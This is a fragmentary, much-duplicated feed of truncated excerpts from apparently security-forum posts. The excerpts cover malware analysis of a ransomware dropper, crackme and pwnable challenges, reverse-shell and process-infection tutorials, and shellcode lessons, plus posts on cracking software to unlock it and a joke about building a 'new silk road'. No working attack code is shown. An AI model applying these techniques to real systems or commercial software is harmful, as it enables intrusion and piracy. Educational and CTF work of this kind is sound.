into very technical low level exploitation, it\u2019s a must-watch talk in my opinion.", "Few days ago I started to debug programm for Xtensa processors. Today i find out, that there is possible for user to create additional commands fot processor with TIE Language. There is not very much documentation in the network and the software for creating commands with TIE, Xtensa Xplorer, availa&hellip;", "This is super interesting. I tried this, and failed, so this is nice to have  I must say I am 100% a fan of these real world scenarios, a bit of realism goes a long way to making it more enjoyable. Knowing what I learn can actually be applied one day is an awesome feeling. Good job on the write-up&hellip;", "Thanks @Silur, Sure it is a lot easier from radare2 but dd is cooler (just kidding). I like to try to explain the basics (as far as I know the topic myself). Then when you use tools like r2 you know what it is actually doing (and you really get to really appreciate the fantastic work all that peopl&hellip;", "This is super interesting. I tried this, and failed, so this is nice to have  I must say I am 100% a fan of these real world scenarios, a bit of realism goes a long way to making it more enjoyable. Knowing what I learn can actually be applied one day is an awesome feeling. Good job on the write-up&hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "To the people against @Red_Joker\u2019s post: I know for a fact that @Red_Joker thought of your \u201cdiscouraging\u201d feedback (which you have all the rights to give ofc) and yet still posted it. That\u2019s pretty brave considering the fact that this forum has really elite people around. Some people start off on t&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "PrefaceYo! It\u2019s been a long time since I last posted anything here. Life kept me more than busy, but now I\u2019ve got a little more time on my hands. I decided to do a write up on the following binary, because it taught me some new things, compared to the easy reversemes I did before. Furthermore &hellip;", "PrefaceYo! It\u2019s been a long time since I last posted anything here. Life kept me more than busy, but now I\u2019ve got a little more time on my hands. I decided to do a write up on the following binary, because it taught me some new things, compared to the easy reversemes I did before. Furthermore &hellip;", "I see a post by @0x00pf i press like. I already could see from the formatting, this is gonna be nice, but I still wanna do it out of my own effort. Sorry pico. Won\u2019t read it for now", "I see a post by @0x00pf i press like. I already could see from the formatting, this is gonna be nice, but I still wanna do it out of my own effort. Sorry pico. Won\u2019t read it for now", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Thanks @Silur, Sure it is a lot easier from radare2 but dd is cooler (just kidding). I like to try to explain the basics (as far as I know the topic myself). Then when you use tools like r2 you know what it is actually doing (and you really get to really appreciate the fantastic work all that peopl&hellip;", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "great article I like how you use dd for extracting, I usually did that with r2 itself", "Continuing the discussion from [Malware Analysis] Case GBC-17_124: The dropper Part I: The get_msg FunctionOur analysis is going pretty well. By now, we know that the get_msg function is the one that gets the data from the network, data that is later dumped into a file. Time to rip it off:       &hellip;", "If you are reading this is because you have miserably failed to solve the Case GBC-17/124. LoL, just kidding. The GBC-17_124 challenge was intended to show you something that you can easily find in the real world, but still easy to solve. Yes, real world stuff is not as fun as the challenge you usua&hellip;", "Well, a few things     Maybe I\u2019m a bloody asshole, dickhead or whatever but, \u2026, honestly, I think that using a cloud based solution like discord go against the principle of privacy. I really hope that the IRC will NEVER be shutdowned. Cya on IRC. Best, Nitrax", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "I guess some of you could use some help with this challenge. There you go. Below you can find the STAN .srep file for the dropper. I think you should be able to extract the malware from the wireshark capture using the information it contains. Run the following command to get the .srep file: cat d&hellip;", "@Suser thinks I have a good perspective on transitioning from scripting (in my case, Ruby) to programming (in C++). This post deals particularly with Ruby and C++, but some facets are broadly applicable. WhyBefore I list some differences between scripting and programming, I will specify a few rea&hellip;", "Hello, Apparently I\u2019ve drink too much coffee today and being high decided to configure Jabber + OTR. In case you are interested in secure instant messaging and want to chat about programming, hardware, security and stuff, feel free to add me to your contact list: afiskon@jabber.ru9AE9C07A 963B06A&hellip;", "That\u2019s what you get for making a binary so user-dependent. ###Diffuclty 4/10 ###Objective Get a shell. ###Rules ASLR on. No libc this time, it\u2019s statically linked, thus its size. Full exploit + demo (i.e asciinema) are accepted as valid solutions. Just a screenshot of the shell does&hellip;", "Hi fellas, I found an interesting docker image on Docker Hub, dedicated to TOR hidden service deployement. The README is self explainatory and worth a try.  https://hub.docker.com/r/goldy/tor-hidden-service/ Take your chance to create the new silk road  Best, Nitrax", "Hi fellas, Let me introduce you my last tool, ORFinder ORFinder claims to be able to find any smtp services, exposed over the internet, vulnerable to open relay attack. Such attack relies on the fact that the sender / receiver addresses are not checked by the underlying mail server, allowing to p&hellip;", "Here\u2019s some feedback: ELF isn\u2019t a format only for executable files. There are also shared libraries and object files. Quoting every section of the book regarding ELF shows me that either you don\u2019t understand the material in depth, or you didn\u2019t bother trying to simplify the terms. Some drawing&hellip;", "Unused RAM is wasted RAM.", "Ok, so I\u2019ve coded a very basic reverse shell that I\u2019ve now decided to allow any member  to access and view the code, but before I post the code I gotta thank @0x00pf for his awesome tutorial and @Joe_Schmoe for  STELF which inspired me to code this shell. I\u2019m trying to add functionality to my shell,&hellip;", "Realmode Assembly - Writing bootable stuff - Part 4Part 4: Basic Math OSWhat is this?This is going to be a walk-through in writing an Operation System in assembly which operates purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal programs t&hellip;", "I can\u2019t get over how super awesome this series is. This is truly the best bridge from learning what goes to together to actually making that in code. I find having code to see and touch helps me learn so much more than just reading how it goes together. This seriously uncovers a lot of mystery. Pe&hellip;", "Realmode Assembly - Writing bootable stuff - Part 3Part 3: Building &amp; RunningWhat is this?This is going to be a walk-through in writing an Operation System in assembly which operates purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal progr&hellip;", "Ok, so I\u2019ve coded a very basic reverse shell that I\u2019ve now decided to allow any member  to access and view the code, but before I post the code I gotta thank @0x00pf for his awesome tutorial and @Joe_Schmoe for  STELF which inspired me to code this shell. I\u2019m trying to add functionality to my shell,&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "Hi! I\u2019m new to SDR. Only played a little bit with RTL-SDR, nothing serious. Recently I\u2019ve also received LimeSDR. When I\u2019ll find a little free time I\u2019m going to try to reverse-engineer some wireless protocol (I got HC-12, NRF24L01, RadioLink T8FB, Turnigy 6X), mostly just to figure out whether I\u2019m i&hellip;", "As @pry0cc insisted that I create a post on how I manually signed a apk file in my post. As requested, here it is. Although please see this link here which is the reference that I used for my so called 1337 hax. Before I begin, what you\u2019ll need is: MetasploitMsfvenomPayloadkeytooljarsignerA b&hellip;", "Realmode Assembly - Writing bootable stuffPart 1: Theory and ConceptsWhat is this?This is going to be a walk-through in writing  Operation Systems in assembly which operate purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal programs to gr&hellip;", "as an alternative to the method above, we also can bruteforce the password by counting the instructions executed which can be done using intel\u2019s pin tool or Linux\u2019s performance analysis tool (perf). this method exploit the fact that the program exits when incorrect character is guessed and executes &hellip;", "@Leeky Could you please take a look at those three resources and consider adding them to the \u201cSources and References\u201d section? http://flint.cs.yale.edu/feng/cos/resources/BIOS/ http://gec.di.uminho.pt/discip/MaisAC/HCW/09R03.pdf https://superuser.com/questions/660143/does-the-bios-have-some-sort&hellip;", "It\u2019s been a while since I wrote something related to my development projects, not to mention something that\u2019s malware-related. This was a concept that I devised (even though it already exists) while I was helping @fraq come up with ideas on stealth techniques on Windows machines. I\u2019ve now completed &hellip;", "Optional 1 byte patch to remove the anti-debug and the 1 byte patch to crack the program; read my comment above, if you\u2019re interested .", "If you start asking like that, 1 byte patch : End of serial checking routine, replace pop ebx or pop esi with pop eax (0x58). The program will start in demo mode, you then have to register. After registering the program exits. Now restarting and you have the full version. CPU DisasmAddress   H&hellip;", "Thanks dtm! My first approaches half way failed with cracked binaries that crashed 50% of the time and worked the other 50%. At the end I did something similar to @rokups and also patched the CRC on the StringTable to mess it that as well. (To allow debugging I just patched a few jumps, I didn\u2019t&hellip;", "Pretty cool anti-debug this time\u2026 Here\u2019s my approach. We use the same strategy as always for finding the anti-debug: Step your way through the code. You\u2019ll see the structure is known from the last two parts; nearly the same. When you come to the loop you\u2019ll know what I mean by nearly . [image] A&hellip;", "#0x00sec CTF Writeup - Forward then ReverseSo yeah, I finally got time to write a writeup for @Deshi\u2019s CTF but I sadly only have stuff written down for the RE challenge (mainly because the other stuff I solved was pretty easy and didn\u2019t require more than a quick google search or simple stuff like &hellip;", "[image]", "Great post @Leeky! As discussed yesterday on IRC\u2026 this is slight modification poking the video memory instead of using the slow BIOS  org 0x8000bits 16push  0xb800pop   es     ; Set ES to the Video Memory;; Clear screenmov ax, 0x1000    ; Clean screen blue backgroundcall  cls;; Pri&hellip;", "BackstoryAfter reading the cracking attempts from the previous thread, edgyReggie asked DownerDanny to take some time into researching further possible solutions to deter crackers. That some time has now passed and edgeS0ft are ready to release their updated software hoping that it will at least ho&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "BackstoryedgyReggie and DownerDanny of edgeS0ft have reviewed the results of the cracking attempts in the previous thread and are quite happy that there is progress in deterring crackers\u2019 attempts at pirating the software. edgyReggie has also noticed that people have been able to share registration&hellip;", "BackstoryedgyReggie has looked over the previous thread once again and has thought that using such an easy encoding method just isn\u2019t going to cut it. He has created a new serial number and obfuscated it yet again, and is confident that nobody can find it. He has also noticed that people have been &hellip;", "It\u2019s good that you utilise plugins to automate anti-anti methods however, I encourage everyone here to disable them so that they can actually understand the process and learn from it. Should there come a time where new anti techniques emerge, reliance on plugins should not be a problem.", "Here\u2019s my approach featuring a persistently fully unlocked program; probably there are many better ways but damn it runs\u2026 At first I wanted to crack the registering process, so that I would have complete access for further reversing approaches. It\u2019s as easy as in the last part: Just NOP the jmp in&hellip;", "Suh peeps! Another pwnable challenge! ###Difficulty Easy, but could be debatable. ###Objective Get a shell. ###Rules ASLR should be turned on!Since no libc is provided, all you have to do is pwn the binary locally.Full PoC is accepted as a solution. Just a screenshot of the shell doesn\u2019t&hellip;", "BackstoryedgyReggie is a busy guy\u2026 He has a massive workload plus a part time job at the local supermarket on the weekends, and on top of that, he has to develop his software for extra pocket money! Because of this, he does not have the time to spare to learn how to really defeat those dirty cracke&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Let\u2019s start with the interrupts. As they are only available in realmode you need to switch from your current mode (Long Mode / Protected Mode) to it and that\u2019s nothing normal user programs can do (nor do I recommend that, didn\u2019t try it myself though). But if you are running DOS you can use them fre&hellip;", "Great post @Leeky! As discussed yesterday on IRC\u2026 this is slight modification poking the video memory instead of using the slow BIOS  org 0x8000bits 16push  0xb800pop   es     ; Set ES to the Video Memory;; Clear screenmov ax, 0x1000    ; Clean screen blue backgroundcall  cls;; Pri&hellip;", "Great post @Leeky! As discussed yesterday on IRC\u2026 this is slight modification poking the video memory instead of using the slow BIOS  org 0x8000bits 16push  0xb800pop   es     ; Set ES to the Video Memory;; Clear screenmov ax, 0x1000    ; Clean screen blue backgroundcall  cls;; Pri&hellip;", "Great post @Leeky! As discussed yesterday on IRC\u2026 this is slight modification poking the video memory instead of using the slow BIOS  org 0x8000bits 16push  0xb800pop   es     ; Set ES to the Video Memory;; Clear screenmov ax, 0x1000    ; Clean screen blue backgroundcall  cls;; Pri&hellip;", "BackstoryedgyReggie is very thankful for those very, very, very few people (probably his parents ) who bought him some coffee to get him through his days in university. As a means of saying Thanks!, he has implemented something that shows the customer\u2019s name on the software after it has been regist&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "Realmode Assembly - Writing bootable stuff - Part 2Part 2: Hello World BootloaderWhat is this?This is going to be a walk-through in writing an Operation System in assembly which operates purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal p&hellip;", "Thanks!. Beginners are the future", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "Congrats! @Leeky we have got the first flag!!!", "took some time but I found 1 flag CTF{Sl33py H0loW}", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "I\u2019m having a good feeling about this\u2026  I love this style of challenge, real life style challenges!", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "aww man couldn\u2019t you have waited another month to drop this so I could have finished my exams peacefully?! Still need to solve the keygen one. Looking forward to it and it\u2019s on my list! Keep waiting for my solution", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "The Greedy Brothers Corp. has approached you, young wannabe, to solve a pretty nasty issue. Many machines have been infected by a mysterious ransomware. The IT department from the Greedy Brothers Corp. have found a dropper in some of the machines but no track of the actual malware\u2026 except, of course&hellip;", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "BackstoryAfter reviewing some of the analysis of his software from the previous thread, edgyReggie thinks he knows where he went wrong. This time, he has made sure that no one will be able to find the new serial number after invalidating the previous one. Can you prove him wrong? DifficultyAuthor&hellip;", "This place is so awesome. I was like, \u201chey, let\u2019s google how to do that\u201d and the VERY FIRST LINK was an 0x00sec tutorial. You guys rock. Edit (by oaktree):", "Suhdudes. I\u2019m back with another challenge but it will be different because this will be designed for Windows! Another thing I will be doing is a kind of \u201cseries\u201d with these crackmes where each successive one will get incrementally more difficult. I will also supply research material (to replace hint&hellip;", "I\u2019d be interested on such a tool whenever is ready", "I\u2019d be interested on such a tool whenever is ready", "Thanks for the help and advice! I want to do something useful in which I will learn a lot. I have no idea how long this may take me, hehe, but it would just be sooo useful for ARM processors", "Thanks for the help and advice! I want to do something useful in which I will learn a lot. I have no idea how long this may take me, hehe, but it would just be sooo useful for ARM processors", "@Leeky pointed out some of the issues. After looking a bit into ftrace, you will really have to change quite some code. Most of the ELF related stuff should be fine, but in addition to the jump opcodes you may also have to rework the break points (that uses a different instruction on ARM) and specia&hellip;", "Python\u2019s scapy might be what you\u2019re looking for. It makes it very easy to script something yourself. Perhaps this can give you an idea:", "@Leeky pointed out some of the issues. After looking a bit into ftrace, you will really have to change quite some code. Most of the ELF related stuff should be fine, but in addition to the jump opcodes you may also have to rework the break points (that uses a different instruction on ARM) and specia&hellip;", "Hello! I have a problem. I have been going through Ryan \u201celfmaster\u201d O\u2019Neill\u2019s Learning Linux Binary Analysis, and have found two of his tools to be clever and very useful. Namely, ftrace and Extended Core File Snapshot. I want to use these on an ARM processor. Can anyone point me in the right dire&hellip;", "Well yeah but you would need to change alot more things (I\u2019ve only looked at the ftrace). for example the branch_table would need ARM opcodes instread of x86 opcodes. Also like you noticed the user_regs_struct needs adjustments to be ARM compatible (usage of ARM registers instead of x86).You also &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Hello, thanks @dtm for this crackme, it was nice relax during Sunday afternoon for me. My original solution was the same as @0x00pf presented in first post, so I try find another single-byte patch. Instead of patching only the length of printed string, I try to change the \u201cmalicious\u201d piece of co&hellip;", "Hello, thanks @dtm for this crackme, it was nice relax during Sunday afternoon for me. My original solution was the same as @0x00pf presented in first post, so I try find another single-byte patch. Instead of patching only the length of printed string, I try to change the \u201cmalicious\u201d piece of co&hellip;", "Hey, pwntools developer here! Here\u2019s some additional pro tips you may want to integrate into your blog payload = str(foo)payload += pack(bar)payload += bazCan be collapsed down into a single statement with the flat() function. payload = flat(foo, bar, baz)Integers are passed to pack, string&hellip;", "That\u2019s because exploit dev is an art", "Sigreturn Oriented ProgrammingIn the name of Allah, the most beneficent, the most merciful. Hello everyone to a new boring article, after we took a small look on normal ROP stuff, I decided to write something more fun !@_py is the one that started that idea! for learning purposes \u2026I hope yo&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "You are overwriting only the return address. ROP gadgets are missing. Are you sure you\u2019re leaking a legit libc address? Where do you return after the leak? Doesn\u2019t look like you\u2019re returning to the right place. Why did you hardcore the address of bin/sh? ASLR should be on. Below is @exploit\u2019s P&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Another solution [spoiler]Setting the length of a write to 0 works in this case, but let\u2019s extrapolate this challenge to a real world case. Imagine that instead of printing a message in the console, the program is actually invoking some protection code that prevents us to reverse the program. In th&hellip;", "Thank you for your reply! I look at this If I find a solution I will post it here", "Thank you for your reply! I look at this If I find a solution I will post it here", "Never tried that, but you can take a look to this: https://kernelnewbies.org/KernelProjects/usermode-helper-enhancements No idea what is the status in recent kernels Hope that helps", "@0x00pf totally nailed this but here\u2019s a blow-by-blow account of my analysis along with an alternative (less elegant) solution. Running ./a.out prints: Remove me!Hello!and then exits. Running objdump -d -Mintel a.out shows that the \u2018_start\u2019 function: Sets the EAX register to 0x8048071 (the a&hellip;", "@0x00pf totally nailed this but here\u2019s a blow-by-blow account of my analysis along with an alternative (less elegant) solution. Running ./a.out prints: Remove me!Hello!and then exits. Running objdump -d -Mintel a.out shows that the \u2018_start\u2019 function: Sets the EAX register to 0x8048071 (the a&hellip;", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "curl -X POST \u201chttps://www.hackthebox.eu/api/invite/generate\u201d", "This challenge is great mate! I\u2019ll love to see the code Congrats I believe this is not what you were looking for, but according to rules, should be fine as It removes the message. [spoiler]I just modified 1 byte\u2026 the size of the string to be removed. Setting it to 0 the write system call will jus&hellip;", "Good job perl -e \u2018print &quot;t&quot;x 0x10\u2019 &gt; keyfile.dat", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Setting count and bs to 1 we are effectively discarding the \\n (one single byte will be written to the output, despite of how many we provide as input), so it works fine, but your is, let\u2019s say, more formal", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "Setting count and bs to 1 we are effectively discarding the \\n (one single byte will be written to the output, despite of how many we provide as input), so it works fine, but your is, let\u2019s say, more formal", "BTW  you can patch it from the command line like this.  Nice challenge @_py echo -e &quot;\\x40&quot; | dd of=exit seek=32 bs=1 count=1 conv=notrunc", "Setting count and bs to 1 we are effectively discarding the \\n (one single byte will be written to the output, despite of how many we provide as input), so it works fine, but your is, let\u2019s say, more formal", "Setting count and bs to 1 we are effectively discarding the \\n (one single byte will be written to the output, despite of how many we provide as input), so it works fine, but your is, let\u2019s say, more formal", "I\u2019m not home atm but are you sure it shouldn\u2019t be: [spoiler]echo -ne \u201c\\x40\u201d | dd of=exit seek=32 bs=1 count=1 cont=notrunc IIRC, -e will add a newline at the end too. Might be wrong though. [/spoiler]", "BTW  you can patch it from the command line like this.  Nice challenge @_py echo -e &quot;\\x40&quot; | dd of=exit seek=32 bs=1 count=1 conv=notrunc", "BTW  you can patch it from the command line like this.  Nice challenge @_py echo -e &quot;\\x40&quot; | dd of=exit seek=32 bs=1 count=1 conv=notrunc", "BTW  you can patch it from the command line like this.  Nice challenge @_py echo -e &quot;\\x40&quot; | dd of=exit seek=32 bs=1 count=1 conv=notrunc", "Hello 0x00ers! Recently, we have added new badges to the site that are awarded to people who solve the challenges posted here. Currently, these badges are: Tier 0 Challenge SolverTier 1 Challenge SolverMore will be added when enough people earn these badges\u2026 \u2013 @oaktree", "Both are cool solutions! Interesting to see how from time to time another guy solves one of the challenges. At this point: Thanks to everyone who participates! I always enjoy seeing that these challenges are really used\u2026", "God damn! You killed it man! +1 for the unintended solution  However, the fix could be much simpler, 1 byte patching to be precise  You identified the problem correctly. The issue was indeed related to the program headers. If you think of it carefuly though, why would readelf assume that the progr&hellip;", "No problem. We can leave this running for a while", "I would have looked at this challenge no matter what, this extra motivation is nice tho. I will keep that in mind and freshly sort my priorities  every time I see some new challenges. new challenges &gt; latest still unsolved challenges &gt; already solved challenges I want to be the very best Like &hellip;", "I would have looked at this challenge no matter what, this extra motivation is nice tho. I will keep that in mind and freshly sort my priorities  every time I see some new challenges. new challenges &gt; latest still unsolved challenges &gt; already solved challenges I want to be the very best Like &hellip;", "Hey, everybody! @Leeky has already got a Tier-0 Challenge Solver badge. What are you waiting for to get yours?  Solve this challenge, earn your own and get one step closer for a Tier-1 Challenge Solver badge! Note: You have to provide unique username/keys pairs to get your badge. Hurry up while &hellip;", "Hey, everybody! @Leeky has already got a Tier-0 Challenge Solver badge. What are you waiting for to get yours?  Solve this challenge, earn your own and get one step closer for a Tier-1 Challenge Solver badge! Note: You have to provide unique username/keys pairs to get your badge. Hurry up while &hellip;", "Hey, everybody! @Leeky has already got a Tier-0 Challenge Solver badge. What are you waiting for to get yours?  Solve this challenge, earn your own and get one step closer for a Tier-1 Challenge Solver badge! Note: You have to provide unique username/keys pairs to get your badge. Hurry up while &hellip;", "Hey, everybody! @Leeky has already got a Tier-0 Challenge Solver badge. What are you waiting for to get yours?  Solve this challenge, earn your own and get one step closer for a Tier-1 Challenge Solver badge! Note: You have to provide unique username/keys pairs to get your badge. Hurry up while &hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Anyone who calls him/herself a hacker, should know about binary formats, especially if you are a low-level wizard. How well do you know the ELF? ###Difficulty Meh, probably easy. ###Rules Though it\u2019s easy to identify what\u2019s up, do justify why you patched the binary that way. ###Hints Hell &hellip;", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "Congrat @Leeky!!  Well Done I\u2019ll PM you with your request;)", "was fun!  ilovecatz&lt;3 : 676a6d7463676d787e3a31 thecakeisalie : 746669635f6f696d7f61686d63 thiswasfun : 746665737b6171647362 471e61656a23702c6861766120612460636b692c5f7224786865247363757263632a24635f62244d?", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "Well, the title says it all. #Hints No hints\u2026 Hints are for wimps\u2026 there are no hints in real life\u2026 RulesPost at least 3 valid username/keys combination in the comments. Do not forget to use the spoiler tag Write-ups are welcomed\u2026 ChallengeGet your binary the usual way: cat text_below | base&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting 